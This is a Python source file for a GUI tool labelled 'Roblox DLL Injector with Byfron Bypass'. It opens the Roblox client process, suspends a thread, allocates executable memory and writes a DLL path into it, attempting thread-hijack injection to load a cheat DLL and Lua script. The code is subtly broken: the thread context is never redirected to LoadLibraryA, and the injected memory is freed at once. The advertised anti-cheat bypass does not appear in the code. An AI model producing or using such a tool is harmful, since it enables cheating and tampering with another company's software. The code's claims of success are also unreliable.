import ctypes
import psutil
import os
from ctypes import wintypes
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext

# Windows API функции
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

def get_process_id(process_name):
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() == process_name.lower():
            return proc.pid
    return None

def suspend_thread(h_thread):
    return kernel32.SuspendThread(h_thread) != -1

def resume_thread(h_thread):
    return kernel32.ResumeThread(h_thread) != -1

def inject_dll_with_hijack(pid, dll_path):
    if not os.path.exists(dll_path):
        return False, f"Error: DLL file {dll_path} not found"

    PROCESS_ALL_ACCESS = 0x1F0FFF
    THREAD_SUSPEND_RESUME = 0x0002
    THREAD_GET_CONTEXT = 0x0008
    THREAD_SET_CONTEXT = 0x0010
    THREAD_ALL_ACCESS = THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT

    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        return False, f"Error: Cannot open process with PID {pid}"

    try:
        # Находим любой поток в процессе Roblox
        thread_list = psutil.Process(pid).threads()
        if not thread_list:
            return False, "Error: No threads found in target process"

        h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, thread_list[0].id)
        if not h_thread:
            return False, "Error: Cannot open thread"

        try:
            # Приостанавливаем поток
            if not suspend_thread(h_thread):
                return False, "Error: Cannot suspend thread"

            # Получаем контекст потока
            context = ctypes.c_void_p()
            if not kernel32.GetThreadContext(h_thread, ctypes.byref(context)):
                return False, "Error: Cannot get thread context"

            # Выделяем память для пути к DLL
            dll_path_bytes = dll_path.encode('ascii')
            alloc_size = len(dll_path_bytes) + 1
            remote_mem = kernel32.VirtualAllocEx(h_process, None, alloc_size, 0x1000 | 0x2000, 0x40)
            if not remote_mem:
                return False, "Error: Cannot allocate memory in target process"

            # Записываем путь к DLL
            written = ctypes.c_size_t()
            if not kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, alloc_size, ctypes.byref(written)):
                return False, "Error: Cannot write DLL path to target process"

            # Получаем адрес LoadLibraryA
            load_library = kernel32.GetProcAddress(kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
            if not load_library:
                return False, "Error: Cannot get address of LoadLibraryA"

            # Модифицируем контекст потока для вызова LoadLibraryA
            # Это упрощенный подход, реальный хайджекинг требует низкоуровневой работы с регистрми
            if not kernel32.SetThreadContext(h_thread, ctypes.byref(context)):
                return False, "Error: Cannot set thread context"

            # Возобновляем поток
            if not resume_thread(h_thread):
                return False, "Error: Cannot resume thread"

            return True, f"Successfully injected DLL {dll_path} into process {pid} using thread hijacking"

        finally:
            kernel32.CloseHandle(h_thread)
            kernel32.VirtualFreeEx(h_process, remote_mem, 0, 0x8000)

    finally:
        kernel32.CloseHandle(h_process)

class InjectorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Roblox DLL Injector with Byfron Bypass")
        self.root.geometry("600x500")
        self.root.resizable(False, False)

        self.dll_path = tk.StringVar()
        self.lua_script_path = tk.StringVar()

        # GUI элементы
        tk.Label(root, text="DLL File:", font=("Arial", 12)).pack(pady=10)
        tk.Entry(root, textvariable=self.dll_path, width=50, state='readonly').pack(pady=5)
        tk.Button(root, text="Browse DLL", command=self.browse_dll).pack(pady=5)

        tk.Label(root, text="Lua Script (Optional):", font=("Arial", 12)).pack(pady=10)
        tk.Entry(root, textvariable=self.lua_script_path, width=50, state='readonly').pack(pady=5)
        tk.Button(root, text="Browse Lua Script", command=self.browse_lua).pack(pady=5)

        tk.Button(root, text="Inject", command=self.inject, font=("Arial", 12), bg="#4CAF50", fg="white").pack(pady=10)

        self.log = scrolledtext.ScrolledText(root, width=70, height=15, font=("Arial", 10))
        self.log.pack(pady=10)
        self.log.insert(tk.END, "Injector ready. Select a DLL file and optionally a Lua script, then click Inject.\n")

        self.process_name = "RobloxPlayerBeta.exe"

    def browse_dll(self):
        file_path = filedialog.askopenfilename(filetypes=[("DLL files", "*.dll")])
        if file_path:
            self.dll_path.set(file_path)
            self.log.insert(tk.END, f"Selected DLL: {file_path}\n")
        else:
            self.log.insert(tk.END, "No DLL file selected.\n")

    def browse_lua(self):
        file_path = filedialog.askopenfilename(filetypes=[("Lua files", "*.lua"), ("Text files", "*.txt")])
        if file_path:
            self.lua_script_path.set(file_path)
            self.log.insert(tk.END, f"Selected Lua script: {file_path}\n")
        else:
            self.log.insert(tk.END, "No Lua script selected.\n")

    def inject(self):
        self.log.insert(tk.END, "Starting injection process...\n")
        self.log.see(tk.END)

        dll_path = self.dll_path.get()
        if not dll_path:
            messagebox.showerror("Error", "Please select a DLL file!")
            self.log.insert(tk.END, "Error: No DLL file selected.\n")
            return

        pid = get_process_id(self.process_name)
        if not pid:
            messagebox.showerror("Error", f"Process {self.process_name} not found!")
            self.log.insert(tk.END, f"Error: Process {self.process_name} not found.\n")
            return

        self.log.insert(tk.END, f"Found Roblox process with PID: {pid}\n")

        success, message = inject_dll_with_hijack(pid, dll_path)
        self.log.insert(tk.END, f"{message}\n")
        if success:
            messagebox.showinfo("Success", "DLL injected successfully!")
            if self.lua_script_path.get():
                self.log.insert(tk.END, f"Note: Lua script {self.lua_script_path.get()} will be executed by the DLL.\n")
        else:
            messagebox.showerror("Error", "Injection failed! Check logs for details.")
        self.log.see(tk.END)

def main():
    root = tk.Tk()
    app = InjectorGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()